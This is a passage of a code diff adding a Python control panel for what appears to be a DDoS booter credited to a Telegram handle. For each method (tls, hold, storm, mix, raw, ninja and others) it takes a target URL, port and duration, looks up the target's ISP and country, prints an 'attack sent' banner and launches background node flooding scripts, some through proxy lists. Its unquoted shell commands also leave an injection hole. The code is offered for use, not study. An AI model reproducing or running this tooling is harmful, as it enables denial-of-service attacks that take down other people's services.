+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node HTTP-X.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "tls" or sinput == "TLS":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'tls',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node TLS.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "hold" or sinput == "HOLD":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'hold',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node hold.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "storm" or sinput == "STORM":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'storm',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node Storm.js {url} {duration} 32 2 proxy.txt')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "mix" or sinput == "MIX":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'mix',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node MIX.js {url} {duration} 32 2')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "raw" or sinput == "RAW":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'raw',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node HTTP-RAW.js {url} {duration}')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "ninja" or sinput == "NINJA":
+            try:
+                url = sin.split()[1]
+                port = sin.split()[2]
+                duration = int(sin.split()[3])
+                rainbow = [196, 202, 220, 82, 39, 93, 201]  # Red→Orange→Yellow→Green→Cyan→Purple→Pink                
+                
+                if duration > 86000:
+                    print("(cnc) duration exceeds the maximum limit (86000s)")
+                    continue
+
+                if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
+                    print(f"(cnc) Maximum concurrent attacks reached ({MAX_CONCURRENT_ATTACKS}). Please wait for one to finish")
+                    continue
+
+
+                ip = get_ip_from_url(url)
+
+                if ip:
+                    asn, isp, org, country = get_ip_info(ip)
+
+                    ongoing_attacks.append({
+                        'host': ip,
+                        'start_time': t.time(),
+                        'duration': duration,
+                        'method': 'ninja',
+                        'status': 'Ongoing'
+                    })
+                    os.system('clear')
+
+                    print(f"""
+\033[38;5;{rainbow[0]}mLAUNCH ATTACK ON:\033[38;5;{rainbow[1]}m ({waktu()})\033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\033[38;5;{rainbow[3]}m ⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀ \033[48;5;15m\033[38;5;{rainbow[4]}m ATTACK - DETAILS \033[0m
+\033[38;5;{rainbow[5]}m ⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀    \033[38;5;{rainbow[6]}mSTATUS:\033[38;5;{rainbow[3]}m ATTACK SENT SUCCESSFULLY
+\033[38;5;{rainbow[0]}m ⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀   \033[38;5;{rainbow[1]}mHOST:\033[38;5;{rainbow[4]}m {url}
+\033[38;5;{rainbow[2]}m ⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀  \033[38;5;{rainbow[5]}mPORT:\033[38;5;{rainbow[0]}m {port}
+\033[38;5;{rainbow[6]}m ⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦  \033[38;5;{rainbow[2]}mTIME:\033[38;5;{rainbow[3]}m {duration}
+\033[38;5;{rainbow[1]}m ⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿  \033[38;5;{rainbow[4]}mMETHOD:\033[38;5;{rainbow[5]}m {sinput}
+\033[38;5;{rainbow[0]}m ⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿\033[48;5;15m\033[38;5;{rainbow[3]}m TARGET - DETAILS \033[0m
+\033[38;5;{rainbow[2]}m ⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿  \033[38;5;{rainbow[1]}mASN:\033[38;5;{rainbow[4]}m {asn}
+\033[38;5;{rainbow[5]}m ⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾  \033[38;5;{rainbow[6]}mISP:\033[38;5;{rainbow[0]}m {isp}
+\033[38;5;{rainbow[1]}m ⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿  \033[38;5;{rainbow[2]}mORG:\033[38;5;{rainbow[3]}m {org}
+\033[38;5;{rainbow[4]}m ⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷\033[38;5;{rainbow[5]}mCOUNTRY:\033[38;5;{rainbow[6]}m {country}
+\033[38;5;{rainbow[0]}m ⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻\033[48;5;15m\033[38;5;{rainbow[2]}m CREDITS \033[0m
+\033[38;5;{rainbow[1]}m ⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿\033[38;5;{rainbow[3]}mOWNER:\033[38;5;{rainbow[5]}m @slxughhter
+\033[38;5;{rainbow[6]}m ⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀\033[38;5;{rainbow[0]}mTELE:\033[38;5;{rainbow[2]}m t.me/slxughhter
+
+\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
+""")
+                    os.system(f'cd meth && screen -dm node ninja.js {url} {duration}')
+            except ValueError:
+                print("(cnc) wrong format")
+                main()
+            except IndexError:
+                print("(cnc) method url port time")
+                main()
+
+        elif sinput == "refresh" or sinput == "REFRESH":
